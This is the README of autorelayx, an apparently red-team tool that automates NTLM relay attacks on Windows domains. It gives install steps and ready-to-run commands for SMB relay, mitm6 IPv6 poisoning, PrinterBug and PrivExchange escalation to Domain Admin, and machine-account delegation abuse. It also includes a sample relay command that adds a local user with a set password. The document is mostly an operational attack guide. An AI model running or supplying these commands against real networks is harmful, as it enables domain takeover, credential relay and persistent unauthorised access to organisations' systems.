Autorelayx
=======

Automates the process of setting up advanced relaying techniques.

# Installation

    sudo apt-get install tcpdump python2 python3
    pip install pipenv
    git clone --recurse-submodules https://github.com/Coalfire-Research/autorelayx

Open the file autorelayx/tools/PrivExchange/httpattack.py. Replace the string "dev.testsegment.local/myattackerurl/" 
with your local IP address (run `ip a` to find your local IP). The modified line should look something like: 
`attacker_url = 'http://192.168.1.30'` where 192.68.1.30 is your actual local IP. 

    cd autorelayx
    cp tools/PrivExchange/httpattack.py tools/impacket/impacket/examples/ntlmrelayx/attack/httpattack.py
    sudo pipenv install
    sudo pipenv shell
    cd tools/impacket
    pip install .

# Usage

## SMB relay
Hostlist should be formatted in CIDR notation (192.168.0.0/24) or individual IPs separated by a newline. This will
scan the hosts in the hostlist for any that do not have SMB signing enabled and write them to unsigned-smb-hosts.txt.
Runs ntlmrelayx.py and Responder.

```python autorelayx.py -l <hostlist.txt>```

SMB relay with a custom command and without checking SMB signing.

```python autorelayx.py -tf <targets_file.txt> -c <"net user /add danmcinerney P@ssword123456">```

## IPv6 poisoning
This will run ntlmrelayx, Responder, and mitm6. The -i <interface> argument is optional and specifies the interface to use for both 
Responder and mitm6. The -d <domain> is optional but suggested to use to limit mitm6's responses.

```python autorelayx.py -l <hostlist.txt> -6 -d <domain for mitm6 to poison> -i <interface>```

## Drop the Mic
Escalate a domain user that you have the password for to Domain Admin. Script will test the exchange server(s) for 
vulnerability to SpoolService RPC abuse for the Drop the Mic attack.

```python autorelayx.py --printerbug -dc <domain controller IP/hostname> -u <DOMAIN/user:password> -sf <exchange_servers.txt>```

```python autorelayx.py --printerbug -dc <domain controller IP/hostname> -u <DOMAIN/user:password> -s <Exchange IP/hostname>```

## PrivExchange
Escalate a domain user that you have the password for to Domain Admin.

```python autorelayx.py --privexchange -dc <domain controller IP/hostname> -u <DOMAIN/user:password> -s <exchange server IP/hostname>```

## Passwordless PrivExchange
If you don't have a domain user's password you can try performing the passwordless PrivExchange attack

```python autorelayx.py --httpattack -s <exchange server IP/hostname>```

Passwordless PrivExchange attack coupled with mitm6 poisoning on specific domain

```python autorelayx.py --httpattack -s <exchange server IP/hostname> -6 -d <domain for mitm6 to poison>```

## Delegation
Requires no domain credentials. Creates a new machine account, prints the username and password of the new machine 
account, and modifies its delegation rights. Upon success, please use getST.py from impacket to relay the delegation and
 gain access to the machine account.
 
 ```python autorelayx.py --delegate -dc <domain controller IP/hostname>```

## Domain controller delegation
Requires 2 domain controllers, at least one of which must be vulnerable to PrinterBug, and a domain user's credentials. 
Forces the PrinterBug-vulnerable domain controller to authenticate to the attacker which is relayed to the other domain 
controller. A machine account is created and given delegation rights. Upon success, user can use getST.py from impacket 
to impersonate a domain admin on the newly created machine.

 ```python autorelayx.py --delegate-dc -dc <domain controller IP/hostname> -s <PrinterBug-vulnerable domain controller> -u <DOM/user:password>```